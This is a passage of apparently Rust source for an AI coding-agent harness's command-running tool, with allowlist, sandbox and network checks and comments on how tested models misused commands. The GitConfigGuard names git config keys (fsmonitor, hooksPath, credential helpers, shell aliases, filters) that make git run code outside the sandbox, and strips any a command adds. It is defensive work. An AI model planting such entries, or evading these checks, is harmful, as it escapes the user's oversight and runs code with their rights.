    let mut found = None;
    for entry in std::fs::read_dir(&policy.root).ok()?.flatten() {
        if !entry.file_type().ok()?.is_dir() || !entry.path().join(".git").exists() {
            continue;
        }
        if found.is_some() {
            return None;
        }
        found = Some(entry.file_name().to_string_lossy().into_owned());
    }
    found
}

/// The git to run for the harness's own version-control tools.
///
/// On macOS `/usr/bin/git` is a shim that asks `xcrun` for the real one, and
/// `xcrun` writes a cache under the user's temporary directory, which it finds
/// by itself rather than through `TMPDIR`. Inside the sandbox that directory is
/// not writable, so every `vcs_status` and `vcs_diff` failed with `couldn't
/// create cache file` -- seen in every run of 2026-09-18 that asked. The
/// installed git is used directly when there is one.
fn git_program() -> &'static str {
    static GIT: std::sync::OnceLock<String> = std::sync::OnceLock::new();
    GIT.get_or_init(|| {
        if !cfg!(target_os = "macos") {
            return "git".into();
        }
        let developer = std::process::Command::new("xcode-select")
            .arg("-p")
            .output()
            .ok()
            .filter(|out| out.status.success())
            .map(|out| String::from_utf8_lossy(&out.stdout).trim().to_string());
        developer
            .map(|dir| format!("{dir}/usr/bin/git"))
            .into_iter()
            .chain(
                [
                    "/Library/Developer/CommandLineTools/usr/bin/git",
                    "/opt/homebrew/bin/git",
                    "/usr/local/bin/git",
                ]
                .map(String::from),
            )
            .find(|candidate| Path::new(candidate).is_file())
            .unwrap_or_else(|| "git".into())
    })
}

pub async fn run_command(
    policy: &ToolPolicy,
    executable: &str,
    args: &[String],
) -> Result<ToolResult, ToolError> {
    run_command_with_stdin(policy, executable, args, None).await
}

/// The same, with text written to the command's standard input.
pub async fn run_command_with_stdin(
    policy: &ToolPolicy,
    executable: &str,
    args: &[String],
    stdin: Option<&str>,
) -> Result<ToolResult, ToolError> {
    run_command_in(policy, executable, args, stdin, None).await
}

/// Programs that only mean something to a shell. Run as a process they do
/// nothing and succeed, which is worse than failing: macOS ships `/usr/bin/cd`,
/// and a deployment sending `cd sub && npm run build` was told seventy times
/// that its build had passed.
const SHELL_ONLY: [&str; 6] = ["cd", "pushd", "popd", "source", "export", "."];

/// Arguments that are shell syntax when they stand alone. Passed to a program
/// they are just more arguments, and the command after them never runs.
const SHELL_OPERATORS: [&str; 9] = ["&&", "||", "|", ";", ">", ">>", "<", "2>&1", "&"];

/// Programs a command line usually starts with. Used only to recognise a
/// command passed where it will not run.
const COMMAND_WORDS: [&str; 24] = [
    "ls", "cat", "cd", "find", "grep", "npm", "npx", "ng", "git", "mkdir", "rm", "cp", "mv",
    "node", "python", "python3", "cargo", "pwd", "head", "tail", "touch", "sed", "yarn", "pnpm",
];

fn looks_like_a_command(text: &str) -> bool {
    let mut words = text.split_whitespace();
    let first = words.next().unwrap_or_default();
    COMMAND_WORDS.contains(&first) && (words.next().is_some() || first == "pwd" || first == "ls")
}

/// A command handed to a program that will not run it: `echo "ls -la"`
/// prints the text and exits 0, `sh "ls -la"` looks for a script of that
/// name. Measured 2026-09-22 (Nemotron 3.5, a website from an empty
/// workspace): about a hundred of 122 commands were `echo` of a command
/// line, each reported as a success with nothing done.
fn unexecuted_command_refusal(executable: &str, args: &[String]) -> Option<String> {
    let program = Path::new(executable)
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| executable.to_owned());
    let first = args.first()?;
    match program.as_str() {
        "echo" | "printf" if args.len() == 1 && looks_like_a_command(first) => {
            let mut words = first.split_whitespace();
            let command = words.next().unwrap_or_default();
            let rest: Vec<&str> = words.collect();
            Some(format!(
                "`{program}` only prints its arguments: this would print `{first}`, not run it, \
                 and report success. Run the program itself -- executable `{command}`, args {rest:?}. \
                 To read files use read_file, to list them list_tree."
            ))
        }
        "sh" | "bash" | "zsh" if !first.starts_with('-') && looks_like_a_command(first) => {
            Some(format!(
                "`{program} \"{first}\"` looks for a script file named `{first}`. To run a command line \
             through the shell pass it after -c: args [\"-c\", \"{first}\"] -- or run the program \
             itself, which is usually better."
            ))
        }
        _ => None,
    }
}

fn shell_syntax_refusal(executable: &str, args: &[String]) -> Option<String> {
    if let Some(refusal) = unexecuted_command_refusal(executable, args) {
        return Some(refusal);
    }
    if SHELL_ONLY.contains(&executable) {
        let target = args
            .iter()
            .map(|arg| arg.split_whitespace().next().unwrap_or_default())
            .find(|arg| !arg.is_empty() && *arg != "exec" && *arg != executable);
        let hint = match (executable, target) {
            ("cd" | "pushd", Some(dir)) => format!(
                " To run a program in `{dir}`, pass cwd: \"{dir}\" with that program as the \
                 executable."
            ),
            _ => " Pass cwd with the program that should run in a subdirectory.".into(),
        };
        return Some(format!(
            "`{executable}` is a shell builtin, and there is no shell: every command runs as its \
             own process from the workspace root, so it would change nothing and report success.{hint}"
        ));
    }
    // `find -exec ... ;` is the one common program for which a lone `;` is
    // an argument rather than syntax.
    let find_exec = args
        .iter()
        .any(|arg| matches!(arg.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir"));
    let operator = args.iter().find(|arg| {
        SHELL_OPERATORS.contains(&arg.as_str()) && !(find_exec && (*arg == ";" || *arg == "+"))
    })?;
    Some(format!(
        "`{operator}` is shell syntax, and there is no shell: args reach `{executable}` verbatim, \
         so everything after `{operator}` would be passed to it as arguments and never run. Send \
         one program per call -- the next call runs after this one returns -- and use cwd to run \
         in a subdirectory."
    ))
}

/// A command that serves until stopped: a development server, a static file
/// server. Measured 2026-09-22 (Nemotron 3.5, asked how to start a game): two
/// `python3 -m http.server` calls through `run_command`, each held for the
/// full two-minute timeout and reported as a failure.
fn runs_until_stopped(executable: &str, args: &[String]) -> bool {
    let program = Path::new(executable)
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| executable.to_owned());
    let words: Vec<&str> = args.iter().map(String::as_str).collect();
    let has = |word: &str| words.contains(&word);
    match program.as_str() {
        "python" | "python3" => words
            .windows(2)
            .any(|pair| pair[0] == "-m" && matches!(pair[1], "http.server" | "SimpleHTTPServer")),
        "npx" | "pnpx" | "bunx" => words.iter().any(|word| {
            matches!(*word, "serve" | "http-server" | "live-server" | "vite") && !has("build")
        }),
        "npm" | "pnpm" | "yarn" | "bun" => {
            matches!(
                words.as_slice(),
                ["start", ..]
                    | ["run", "start", ..]
                    | ["run", "dev", ..]
                    | ["run", "serve", ..]
                    | ["dev", ..]
                    | ["serve", ..]
            )
        }
        "ng" => has("serve") || has("s"),
        "vite" => words.is_empty() || has("dev") || has("preview") || has("serve"),
        "php" => has("-S"),
        "flask" => has("run"),
        "uvicorn" | "gunicorn" | "http-server" | "live-server" | "serve" => true,
        _ => false,
    }
}

/// Whether a command kills processes by name: `pkill` or `killall` as the
/// program, or inside the script of a shell given with `-c`.
fn kills_by_name(executable: &str, args: &[String]) -> bool {
    let word = |text: &str| {
        text.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '/'))
            .any(|token| {
                let name = token.rsplit('/').next().unwrap_or(token);
                matches!(name, "pkill" | "killall")
            })
    };
    let program = executable.rsplit('/').next().unwrap_or(executable);
    if matches!(program, "pkill" | "killall") {
        return true;
    }
    matches!(program, "sh" | "bash" | "zsh" | "dash")
        && args
            .windows(2)
            .any(|pair| pair[0] == "-c" && word(&pair[1]))
}

/// The same, run from a workspace-relative directory.
pub async fn run_command_in(
    policy: &ToolPolicy,
    executable: &str,
    args: &[String],
    stdin: Option<&str>,
    cwd: Option<&str>,
) -> Result<ToolResult, ToolError> {
    if let Some(refusal) = shell_syntax_refusal(executable, args) {
        return Err(ToolError::Denied(refusal));
    }
    // Without a sandbox, nothing stops a command from killing what it matches
    // by name -- the engineer's own dev server, or PWR's. Measured 2026-10-01:
    // an agent in Full access ran `pkill -f 'ng serve'` to free a port and killed
    // the server of PWR's own window, which then showed the site it was building.
    // (Inside the sandbox the profile denies signalling any process it did not
    // start.)
    if matches!(
        policy.sandbox,
        SandboxPolicy::FullAccess | SandboxPolicy::Disabled
    ) && kills_by_name(executable, args)
    {
        return Err(ToolError::Denied(
            "PWR does not kill processes by name (`pkill`, `killall`): the match can be the \
             engineer's own server, or PWR's own window. Stop what you started with \
             stop_service; if a port is taken, pass another port to the program, or tell the \
             engineer which process holds it."
                .to_owned(),
        ));
    }
    if runs_until_stopped(executable, args) {
        return Err(ToolError::Denied(format!(
            "`{executable} {}` serves until it is stopped, so run_command would only wait for its \
             timeout and report a failure. To exercise it during the task, use start_service with \
             the same executable and args: it waits until the port accepts connections, reports \
             it, and stops the service when the turn ends. If the person wants to run it \
             themselves, tell them the command instead of running it.",
            args.join(" ")
        )));
    }
    // Quotes around the folder are the shell's, not part of its name.
    // Measured 2026-09-29: Ornith-1.5-9B sent `"."` and the workspace's own
    // absolute path in quotes, and both were refused as missing folders.
    let cwd = match cwd
        .map(|dir| dir.trim().trim_matches(|c| c == '"' || c == '\''))
        .filter(|dir| !dir.is_empty() && *dir != ".")
    {
        None => None,
        Some(dir) => {
            let resolved = policy.resolve(Path::new(dir))?;
            if !resolved.is_dir() {
                // The likeliest slip: the workspace's own name, or a parent's,
                // written in front of a folder that is there. Measured
                // 2026-09-29: `web/web` from a workspace named `web`, whose
                // project was in its subfolder `web`.
                let parts: Vec<&str> = dir.split('/').filter(|part| !part.is_empty()).collect();
                let meant = (1..parts.len())
                    .map(|skip| parts[skip..].join("/"))
                    .find(|candidate| policy.root.join(candidate).is_dir());
                return Err(ToolError::Denied(match meant {
                    Some(meant) => format!(
                        "cwd `{dir}` is not a folder in the workspace; paths start at the \
                         workspace root, so it is probably `{meant}`, which is"
                    ),
                    None => format!(
                        "cwd `{dir}` is not a directory in the workspace; list_tree shows what is there"
                    ),
                }));
            }
            Some(resolved)
        }
    };
    // A program name never contains whitespace, so this is a whole command line
    // put where the executable belongs. Left to run, it reaches exec as one
    // filename and comes back as `execvp() of 'ls -la' failed: No such file or
    // directory`, which reads like a missing program rather than a malformed
    // call. Measured across several runs -- `ls -la`, and the same shape again
    // and again -- each costing an action to a message that did not say what
    // was wrong.
    if executable.split_whitespace().count() > 1 {
        let mut words = executable.split_whitespace();
        let program = words.next().unwrap_or_default();
        let rest: Vec<&str> = words.collect();
        return Err(ToolError::Denied(format!(
            "`{executable}` is a command line, not a program name. Pass the program alone as \
             executable -- `{program}` -- and put {} in args.",
            rest.join(" ")
        )));
    }
    // The other half of the same misunderstanding: `args` read as the whole
    // argv, with the program repeated at the front. Left to run, `npm` with
    // args `["npm", "run", "build"]` executes `npm npm run build` and comes
    // back as npm's own `Unknown command: "npm"`, which reads like a broken
    // toolchain rather than a malformed call. Measured on an Angular build:
    // three consecutive actions lost to it -- `npm npm run build`, then
    // `node npm --version`, then `sh which npm` -- before the deployment
    // worked around it with `bash -c`.
    //
    // It was refused by name, and the refusal did not teach: across the R2
    // pilot traces of 2026-09-14/15, 33 of B1's actions were this denial --
    // `python`, `python3`, `cargo`, `npx`, `node` -- each one charged to the
    // action budget for a call whose meaning was never in doubt. So the leading
    // repeat is dropped and the command runs. The audit keeps the args as
    // proposed. A repeat with nothing after it is still refused: running the
    // bare program would start an interpreter waiting on input.
    let program = program_name(executable);
    let args = args_after_program(executable, args)?;
    if program == "npx" && args.first().is_some_and(|arg| arg == "run") {
        return Err(ToolError::Denied(format!(
            "`npx run {}` invokes the package named `run`, not this project's build script. \
             Use executable `npm` with args [\"run\", \"{}\"] and cwd set to the project's directory.",
            args.get(1).map(String::as_str).unwrap_or("<script>"),
            args.get(1).map(String::as_str).unwrap_or("<script>")
        )));
    }
    if program == "npm"
        && args.first().is_some_and(|arg| arg == "run")
        && cwd.is_none()
        && !policy.root.join("package.json").exists()
    {
        let projects: Vec<_> = std::fs::read_dir(&policy.root)
            .into_iter()
            .flatten()
            .flatten()
            .filter(|entry| entry.path().join("package.json").is_file())
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .collect();
        if let [project] = projects.as_slice() {
            return Err(ToolError::Denied(format!(
                "package.json is in `{project}/`, not the workspace root. Retry executable `npm` \
                 with the same args and cwd `{project}`."
            )));
        }
    }
    // The derived allowlist cannot name the toolchain a workspace does not yet
    // have: a task that must install a JDK needs an executable no marker in the
    // repository could have implied. The grant is what widens it, and it is
    // recorded in the audit like every other.
    if !policy.permits_program(executable) {
        // Naming the way out, rather than only the wall. The allowlist is
        // derived from what a repository declares, so a workspace that is not
        // yet a project has an empty one and every command a deployment reaches
        // for is refused -- correctly, and with nothing to do about it.
        // Measured on the ornith-1.5:35b run of 2026-09-07: five of fifty
        // actions spent on `python3`, `python`, `python3.11`, `node` and
        // `which`, to run a verification script the deployment had written
        // itself, with `verifier-proposal` granted and `propose_verifier` never
        // called. The same shape of refusal that names `extract_document` sent
        // both models straight to it on the first try.
        //
        // The list is named rather than described. A first version of this
        // message said the workspace declared no checks, which was true of the
        // run it was written from and false of the next one -- an Angular
        // project whose `npm` was allowlisted all along, being told it had
        // nothing. What a run may execute is a fact it can act on; a story
        // about why is one more thing to be wrong about.
        let permitted = if policy.allow_commands.is_empty() {
            "Nothing is allowlisted in this workspace: the list is derived from the checks the \
             project declares, and it declares none."
                .to_string()
        } else {
            format!(
                "This run may execute: {}. The list is derived from the checks this project \
                 declares.",
                policy.allow_commands.join(", ")
            )
        };
        // D8, from the R2 rerun: seven denials were `cat`, `head`, `grep` and
        // `find` -- reads this harness does through tools, with a sandbox and
        // an audit a shell would bypass. Naming the tool costs the caller
        // nothing; leaving it to guess cost a turn each time.
        let instead = match executable {
            "cat" | "head" | "tail" | "more" | "less" => {
                " Read a file with read_file, which is not a command and is always available."
            }
            "grep" | "rg" | "ag" | "ack" => {
                " Search with search, which is not a command and is always available."
            }
            "ls" | "tree" | "dir" => {
                " List the workspace with list_tree, which is not a command and is always available."
            }
            "find" | "fd" => {
                " List the workspace with list_tree, or match text with search; neither is a command."
            }
            _ => "",
        };
        let way_out = if policy.approvals.contains(&Approval::VerifierProposal) {
            " Propose a command as this workspace's verifier with propose_verifier: adopted, it \
             joins the list and the run is judged against it."
        } else {
            " Nothing in this run can widen it, so say which command the work needs and why \
             rather than trying another one."
        };
        return Err(ToolError::Denied(format!(
            "command {executable} is not allowlisted.{instead} {permitted}{way_out}"
        )));
    }
    if !policy.network_allowed()
        && args
            .iter()
            .any(|a| a.contains("http://") || a.contains("https://"))
    {
        return Err(ToolError::Denied(
            "network access requires an explicit grant".into(),
        ));
    }
    if let Some(approval) = command_approval(executable, args) {
        policy.require(approval)?;
    }
    run_command_once(policy, executable, args, stdin, cwd.as_deref()).await
}

/// Said when a command that timed out was a server: it was never going to
/// finish, and the tool for it exists. Measured 2026-09-29 on Ornith-1.5-9B
/// building an HTTP API: `node server.js` as a command, three minutes lost to
/// the timeout, and then a shell line to background it that was refused.
const SERVER_HANG_HINT: &str = " This looks like a server, which runs until it is stopped: \
     start it with start_service, which keeps it running in the background and reports when \
     it is ready, then exercise it with a separate command such as curl.";

/// Whether a command that hung was starting a server, from what it ran and
/// what it printed before it was stopped.
fn looks_like_a_server(executable: &str, args: &[String], printed: &str) -> bool {
    let printed = printed.to_ascii_lowercase();
    let said_so = [
        "listening",
        "running on",
        "running at",
        "localhost:",
        "127.0.0.1:",
        "0.0.0.0:",
    ]
    .iter()
    .any(|marker| printed.contains(marker));
    let line = std::iter::once(executable)
        .chain(args.iter().map(String::as_str))
        .collect::<Vec<_>>()
        .join(" ")
        .to_ascii_lowercase();
    let named_so = [
        "server.",
        "app.js",
        "http.server",
        "npm start",
        "npm run dev",
        "npm run serve",
        "uvicorn",
        "flask run",
        "manage.py runserver",
        "vite",
        "live-server",
        "http-server",
        "serve ",
    ]
    .iter()
    .any(|marker| line.contains(marker));
    said_so || named_so
}

async fn run_command_once(
    policy: &ToolPolicy,
    executable: &str,
    args: &[String],
    stdin: Option<&str>,
    cwd: Option<&Path>,
) -> Result<ToolResult, ToolError> {
    let sandboxed = policy.will_sandbox()?;
    let mut command = policy.prepare_command(executable, args)?;
    if let Some(dir) = cwd {
        command.current_dir(dir);
    }
    let started = std::time::Instant::now();
    command
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        // Dropping a cancelled PWR future must not orphan the process.
        .kill_on_drop(true);
    #[cfg(unix)]
    command.process_group(0);
    let git_config = GitConfigGuard::take(&policy.root);
    let mut child = command.spawn()?;
    let mut process_group = ProcessGroupGuard::new(child.id());
    if let Some(mut pipe) = child.stdin.take() {
        use tokio::io::AsyncWriteExt as _;
        let input = stdin.unwrap_or_default().as_bytes().to_vec();
        tokio::spawn(async move {
            let _ = pipe.write_all(&input).await;
            let _ = pipe.shutdown().await;
        });
    }
    let stream_limit = policy.output_limit.min(COMMAND_STREAM_BYTES);
    let stdout_task = tokio::spawn(read_bounded_pipe(
        child
            .stdout
            .take()
            .ok_or_else(|| ToolError::Io(std::io::Error::other("child stdout was not piped")))?,
        stream_limit,
    ));
    let stderr_task = tokio::spawn(read_bounded_pipe(
        child
            .stderr
            .take()
            .ok_or_else(|| ToolError::Io(std::io::Error::other("child stderr was not piped")))?,
        stream_limit,
    ));
    let status = match timeout(policy.timeout, child.wait()).await {
        Ok(status) => status?,
        Err(_) => {
            process_group.terminate();
            let _ = child.kill().await;
            let _ = child.wait().await;
            // What it printed before it was stopped. Measured 2026-09-27
            // (stack matrix c2, java-ratelimit): `mvn test` hung on a test
            // six times and each time came back as "tool timed out" alone;
            // with no way to see which test, the model spent forty minutes
            // building its own runner. Surefire had printed the test's name.
            // Bounded, in case a process outside the group holds a pipe.
            let settle = std::time::Duration::from_secs(2);
            let mut printed = String::new();
            for (name, task) in [("stdout", stdout_task), ("stderr", stderr_task)] {
                if let Ok(Ok(Ok(capture))) = timeout(settle, task).await {
                    let (text, _) = policy.redact(&String::from_utf8_lossy(&capture.retained));
                    let text = text.trim_end();
                    if !text.is_empty() {
                        let skip = text.chars().count().saturating_sub(2_000);
                        let tail: String = text.chars().skip(skip).collect();
                        printed.push_str(&format!("\n--- end of {name} ---\n{tail}"));
                    }
                }
            }
            return Err(ToolError::CommandTimedOut(format!(
                "the command did not finish within {} s and was stopped. A command that hangs is \
                 usually waiting for something that never comes -- a test blocked on a lock, a \
                 wait or a loop, a server that is never stopped, input it expects.{}{} {}",
                policy.timeout.as_secs(),
                if looks_like_a_server(executable, args, &printed) {
                    SERVER_HANG_HINT
                } else {
                    ""
                },
                if sandboxed { SANDBOX_HANG_HINT } else { "" },
                if printed.is_empty() {
                    "It printed nothing before it was stopped.".to_owned()
                } else {
                    format!("The end of what it printed shows where it was:{printed}")
                }
            )));
        }
    };
    // Whatever the command left running in its group is stopped with it. A
    // command that starts a server with `&` and returns leaves that server
    // behind, owned by nothing, holding a port nobody can see: measured
    // 2026-10-01, an `ng serve --port 4300` still running 26 minutes after the
    // command that started it. A server is started with start_service, which
    // has an owner and a stop. Done before the pipes are read, too: a
    // background process holding them open made that wait forever.
    process_group.terminate();
    let removed = git_config.settle();
    let stdout_capture = stdout_task
        .await
        .map_err(|_| ToolError::Io(std::io::Error::other("stdout reader failed")))??;
    let stderr_capture = stderr_task
        .await
        .map_err(|_| ToolError::Io(std::io::Error::other("stderr reader failed")))??;
    let (stdout, a) = policy.redact(&String::from_utf8_lossy(&stdout_capture.retained));
    let (mut stderr, b) = policy.redact(&String::from_utf8_lossy(&stderr_capture.retained));
    if !removed.is_empty() {
        stderr.push_str(&format!(
            "\n[PWR] removed from .git/config what this command added that git would run with the \
             person's rights, outside the sandbox: {}. The rest of the change was kept.",
            removed.join(", ")
        ));
    }
    let artifact_hash = hash_bytes(format!(
        "{}:{}:{:?}",
        stdout_capture.hash,
        stderr_capture.hash,
        status.code()
    ));
    if sandboxed && status.code() != Some(0) && refused_by_sandbox(&stdout, &stderr) {
        stderr.push_str(SANDBOX_REFUSAL_HINT);
        if !policy.approvals.contains(&Approval::DependencyChange) {
            stderr.push_str("\n[PWR] Installed dependency trees are read-only without DependencyChange approval; dependency installs or rewrites require that grant. Protected task paths remain read-only even with it.\n");
        }
    }
    if let Some(note) = npx_fetched_package(&stderr) {
        stderr.push_str(&note);
    }
    // Named from the workspace root, as every tool's `path` is: the absolute
    // form a compiler prints is one a tool then refuses.
    let failing_files = (status.code() != Some(0))
        .then(|| diagnostics_summary(&stdout, &stderr))
        .flatten()
        .map(|summary| from_the_root(&policy.root, &summary));
    let ran_in = ran_in(&policy.root, cwd);
    Ok(ToolResult {
        exit_code: status.code(),
        artifact_hash,
        stdout,
        stderr,
        stdout_truncated: stdout_capture.truncated,
        stderr_truncated: stderr_capture.truncated,
        duration_ms: started.elapsed().as_millis(),
        redacted: a || b,
        sandboxed,
        failing_files,
        ran_in,
    })
}

/// Where a command ran, said when it was a folder under the root.
///
/// A command's paths are read from its `cwd`; every tool's `path` is read
/// from the workspace root. A model that has moved into a folder mixes the
/// two. Seen 2026-10-07 (gpt-oss 20B, an Angular site scaffolded in
/// `archi-site/`): `tsc -p archi-site/tsconfig.app.json` run with `cwd:
/// archi-site`, and in the run before it file tools aimed at `src/app/...`
/// when the files were under `tmp-app/`. The result now says where it ran.
pub fn ran_in(root: &Path, cwd: Option<&Path>) -> Option<String> {
    let cwd = cwd?;
    let whole = |path: &Path| path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
    let (root, cwd) = (whole(root), whole(&root.join(cwd)));
    let relative = cwd.strip_prefix(&root).ok()?;
    if relative.as_os_str().is_empty() {
        return None;
    }
    let folder = relative.display();
    Some(format!(
        "{folder}/ -- paths written in this command are read from {folder}/; a tool's `path` \
         is always from the workspace root, so a file there is `{folder}/<file>`"
    ))
}

/// `text` with the workspace root taken off the front of the paths in it.
fn from_the_root(root: &Path, text: &str) -> String {
    let mut text = text.to_owned();
    for form in [root.canonicalize().ok(), Some(root.to_path_buf())]
        .into_iter()
        .flatten()
    {
        text = text.replace(&format!("{}/", form.display()), "");
    }
    text
}

/// Said when `npx` fetched a package the project does not have and ran it:
/// whatever it printed is that package's, not the project's.
///
/// Measured 2026-09-30 (Qwen3-14B in the desktop): meaning to run its
/// Playwright tests, it ran `npx test test.js`; npx installed an unrelated
/// package named `test`, which exited 0 without running a test, and the turn
/// ended on it as a pass.
fn npx_fetched_package(stderr: &str) -> Option<String> {
    const MARKERS: [&str; 2] = [
        "The following package was not found and will be installed: ",
        "Need to install the following packages:",
    ];
    let package = MARKERS.iter().find_map(|marker| {
        let at = stderr.find(marker)? + marker.len();
        stderr[at..].split_whitespace().next().map(str::to_owned)
    })?;
    Some(format!(
        "\n[PWR] npx downloaded `{package}` from the registry and ran it; it is not a dependency \
         of this project, so this output is that package's and says nothing about the project. \
         If that is not the program you meant, the one you want is probably a script in \
         package.json or the command of a package you installed."
    ))
}

/// Said when a sandboxed command hangs. Measured 2026-09-29: MSBuild's build
/// node died when the sandbox refused its socket, and the build waited for
/// it until it was stopped -- which read as a project that hangs.
const SANDBOX_HANG_HINT: &str = " It ran in the sandbox, and a program waiting on a socket, \
     a file or a process the sandbox refused hangs the same way: if nothing in the project \
     explains it, run it again with outside_sandbox true, and the person is asked.";

/// Said when a sandboxed command failed the way a sandbox refusal reads.
const SANDBOX_REFUSAL_HINT: &str = "\n[PWR] This command ran in the sandbox and its output \
     reads like the sandbox refusing it (\"Operation not permitted\"): writes outside the \
     workspace, and some sockets, are refused there. If the project is not what failed, run it \
     again with outside_sandbox true -- the person is asked first.";

/// Whether a failed command's output reads like the sandbox refusing it.
/// macOS's sandbox refuses with EPERM, which programs print as "Operation
/// not permitted"; a plain "Permission denied" is a file mode, not the
/// sandbox, and is left alone.
fn refused_by_sandbox(stdout: &str, stderr: &str) -> bool {
    [stdout, stderr]
        .iter()
        .any(|text| text.contains("Operation not permitted") || text.contains("EPERM"))
}

/// `.git/config` as it was before a command, to take out afterwards what
/// the command added that git would run: a `core.fsmonitor`, a hooks path,
/// an alias that runs a shell, a filter or diff driver, an include... git
/// runs those for whoever uses it next -- the person, their editor, PWR --
/// with their rights and no sandbox, and none of it shows in a diff. The
/// rest of what the command wrote stays: `git remote add`, a branch that
/// tracks one, a setting.
struct GitConfigGuard {
    path: PathBuf,
    before: Option<String>,
}

impl GitConfigGuard {
    fn take(root: &Path) -> Self {
        let path = root.join(".git").join("config");
        let before = std::fs::read_to_string(&path).ok();
        Self { path, before }
    }

    /// The entries the command added that run something, each removed.
    fn settle(&self) -> Vec<String> {
        let Ok(after) = std::fs::read_to_string(&self.path) else {
            return Vec::new();
        };
        if self.before.as_deref() == Some(after.as_str()) {
            return Vec::new();
        }
        let had = git_config_runs_code(self.before.as_deref().unwrap_or_default());
        let added: Vec<String> = git_config_runs_code(&after)
            .into_iter()
            .map(|(_, name)| name)
            .filter(|name| !had.iter().any(|(_, seen)| seen == name))
            .collect();
        if !added.is_empty() {
            let lines: Vec<usize> = git_config_runs_code(&after)
                .into_iter()
                .filter(|(_, name)| added.contains(name))
                .map(|(line, _)| line)
                .collect();
            let kept: String = after
                .split_inclusive('\n')
                .enumerate()
                .map(|(index, line)| {
                    if !lines.contains(&index) {
                        return line.to_owned();
                    }
                    // `[section] key = value`: the header stays, so the lines
                    // after it keep their section.
                    match line
                        .trim_start()
                        .strip_prefix('[')
                        .and_then(|h| h.find(']'))
                    {
                        Some(end) => {
                            let start = line.len() - line.trim_start().len();
                            format!("{}\n", &line[..start + end + 2])
                        }
                        None => String::new(),
                    }
                })
                .collect();
            let _ = std::fs::write(&self.path, kept);
        }
        added
    }
}

/// The entries of a git config that make git run something, each with its
/// line: `section[.subsection].key`, section and key lowercased as git
/// compares them.
fn git_config_runs_code(config: &str) -> Vec<(usize, String)> {
    let mut found = Vec::new();
    let mut section = String::new();
    let mut subsection: Option<String> = None;
    for (index, line) in config.lines().enumerate() {
        let mut rest = line.trim();
        if let Some(header) = rest.strip_prefix('[')
            && let Some(end) = header.find(']')
        {
            let inside = header[..end].trim();
            (section, subsection) = match inside.split_once(char::is_whitespace) {
                Some((name, sub)) => (
                    name.to_ascii_lowercase(),
                    Some(sub.trim().trim_matches('"').to_owned()),
                ),
                None => match inside.split_once('.') {
                    Some((name, sub)) => (name.to_ascii_lowercase(), Some(sub.to_owned())),
                    None => (inside.to_ascii_lowercase(), None),
                },
            };
            // `[section] key = value` is one line too.
            rest = header[end + 1..].trim();
        }
        if rest.is_empty() || rest.starts_with('#') || rest.starts_with(';') {
            continue;
        }
        let (key, value) = rest.split_once('=').unwrap_or((rest, ""));
        let key = key.trim().to_ascii_lowercase();
        let runs = match (section.as_str(), key.as_str()) {
            (
                "core",
                "fsmonitor"
                | "hookspath"
                | "sshcommand"
                | "pager"
                | "editor"
                | "askpass"
                | "gitproxy"
                | "alternaterefscommand",
            ) => true,
            ("sequence", "editor") | ("diff", "external") | ("web", "browser") => true,
            ("diff", "textconv" | "command") | ("merge", "driver") => subsection.is_some(),
            ("filter", "clean" | "smudge" | "process") => true,
            ("alias", _) => value.trim_start().starts_with('!'),
            ("credential", "helper") | ("include" | "includeif", "path") => true,
            ("remote", "uploadpack" | "receivepack") | ("uploadpack", "packobjectshook") => true,
            ("gpg", "program") | ("pager", _) => true,
            ("browser" | "man" | "difftool" | "mergetool", "cmd" | "path") => true,
            _ => false,
        };
        if runs {
            let name = match &subsection {
                Some(sub) => format!("{section}.{sub}.{key}"),
                None => format!("{section}.{key}"),
            };
            found.push((index, name));
        }
    }
    found
}

struct ProcessGroupGuard {
    pid: Option<u32>,
}

impl ProcessGroupGuard {
    fn new(pid: Option<u32>) -> Self {
        Self { pid }
    }

    fn terminate(&mut self) {
        #[cfg(unix)]
        if let Some(pid) = self.pid.take() {
            // `output()` rather than `status()`: a kill of a process group
            // that has already exited prints to stderr, and the run's stderr
            // is where `--json` output goes. Internal cleanup must not corrupt
            // the caller's document.
            let _ = std::process::Command::new("/bin/kill")
                .arg("-KILL")
                .arg(format!("-{pid}"))
                .output();
        }
        #[cfg(not(unix))]
        {
            self.pid = None;
        }
    }
}

impl Drop for ProcessGroupGuard {
    fn drop(&mut self) {
        self.terminate();
    }
}

struct BoundedPipe {
    retained: Vec<u8>,
    truncated: bool,
    hash: String,
}

/// Reads a child's pipe, keeping both ends of what it wrote.
///
/// This kept the first `limit` bytes and discarded the rest, and the rest is
/// where the answer lives. Every test runner puts its verdict at the end --
/// `test result: FAILED`, pytest's short summary, `go test`'s `FAIL` -- so a
/// suite that printed twenty thousand passing lines and failed on the last one
/// reached the deployment as twenty thousand passing lines. It was then asked
/// to diagnose a failure it had never been shown, and the run that followed
/// measured that, not the deployment.
///
/// Keeping only the tail would be the same defect mirrored: a compiler's first
/// error is the one that caused the others. So both ends are kept, and the gap
/// says how much it swallowed -- a gap that reads as continuous output is worse
/// than no output, because conclusions get drawn from lines that were never
/// adjacent.
async fn read_bounded_pipe(
    mut pipe: impl tokio::io::AsyncRead + Unpin,
    limit: usize,
) -> Result<BoundedPipe, std::io::Error> {
    use tokio::io::AsyncReadExt as _;
    // The elision marker is paid for out of the limit, not added on top: a
    // bound that can be exceeded is not a bound, and an existing fixture holds
    // the whole crate to that. A limit too small to hold the marker keeps the
    // head only -- a degenerate bound gets the degenerate behaviour rather than
    // a special case that quietly grows it.
    const MARKER_BUDGET: usize = 48;
    let (head_budget, tail_budget) = if limit > MARKER_BUDGET * 2 {
        let usable = limit - MARKER_BUDGET;
        let tail = usable / 2;
        // An odd budget gives the extra byte to the head, where the first
        // error is.
        (usable - tail, tail)
    } else {
        (limit, 0)
    };
    let mut head = Vec::with_capacity(head_budget.min(64 * 1024));
    let mut tail: std::collections::VecDeque<u8> = std::collections::VecDeque::new();
    let mut hasher = blake3::Hasher::new();
    let mut buffer = [0u8; 8192];
    let mut observed = 0usize;
    loop {
        let read = pipe.read(&mut buffer).await?;
        if read == 0 {
            break;
        }
        observed = observed.saturating_add(read);
        hasher.update(&buffer[..read]);
        let chunk = &buffer[..read];
